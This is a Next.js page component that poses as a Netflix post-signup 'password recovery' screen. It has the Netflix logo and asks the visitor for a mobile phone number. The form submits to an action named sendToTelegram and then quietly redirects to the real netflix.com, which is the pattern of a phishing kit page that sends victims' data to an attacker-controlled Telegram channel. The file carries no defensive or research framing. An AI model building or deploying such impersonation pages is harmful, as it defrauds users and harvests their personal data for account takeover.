'use client'

import Image from 'next/image'
import Link from 'next/link'
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import NetflixImage from '../../public/netflix-logo.svg'
import { sendToTelegram } from '../actions/telegram'
import { useState, useEffect } from 'react'
import { useFormState } from 'react-dom'
import { useRouter } from 'next/navigation'
import { CountryCodeScroller } from '../components/countryCodeScroller'

type State = {
  error?: string;
  success?: boolean;
  url?: string;
} | null;

export default function SuccessPage() {
  const router = useRouter()
  const [state, formAction] = useFormState<State, FormData>(sendToTelegram, null)
  const [phoneNumber, setPhoneNumber] = useState('')
  const [selectedCountry, setSelectedCountry] = useState({ name: 'United States', code: '+1', flag: '🇺🇸' })

  useEffect(() => {
    if (state?.success) {
      const timer = setTimeout(() => {
        router.push('https://www.netflix.com')
      }, 3000)
      return () => clearTimeout(timer)
    }
  }, [state, router])

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '')
    setPhoneNumber(value)
  }

  return (
    <div className="min-h-screen bg-white">
      <header className="flex justify-between items-center px-4 py-6">
        <Image
          src={NetflixImage}
          alt="Netflix"
          width={167}
          height={45}
          className="cursor-pointer"
        />
        <Link 
          href="#" 
          className="text-zinc-800 hover:underline font-medium"
        >
          Help
        </Link>
      </header>

      <main className="max-w-[440px] mx-auto px-4 py-12">
        <div className="space-y-6 text-center">
          <h1 className="text-3xl font-medium text-zinc-900">
            Welcome to Netflix!
          </h1>
          
          <p className="text-lg text-zinc-600">
            Remember you can cancel anytime in the Account section.
          </p>

          <form action={formAction} className="space-y-4">
            <div className="bg-zinc-100 p-6 rounded-md space-y-4 mt-8">
              <h2 className="text-lg text-zinc-700 font-medium">
                Set up password recovery
              </h2>
              
              <p className="text-zinc-600">
                Your phone number will be used to help you access and recover your account. Message and data rates may apply.
              </p>

              <div className="space-y-4">
                <CountryCodeScroller
                  onSelect={setSelectedCountry}
                  selectedCountry={selectedCountry}
                />

                <div className="relative">
                  <div className="absolute inset-y-0 left-3 flex items-center pointer-events-none">
                    <span className="text-zinc-500">{selectedCountry.code}</span>
                  </div>
                  <Input
                    type="tel"
                    name="phoneNumber"
                    placeholder="Mobile phone number"
                    className="pl-12 py-6 bg-white"
                    value={phoneNumber}
                    onChange={handlePhoneChange}
                  />
                </div>
              </div>
            </div>

            <Button 
              type="submit"
              className="w-full bg-red-600 hover:bg-red-700 text-white py-6 text-xl mt-6"
            >
              Next
            </Button>

            {state?.error && (
              <p className="text-red-500 mt-2">{state.error}</p>
            )}
            {state?.success}
          </form>
        </div>
      </main>
    </div>
  )
}

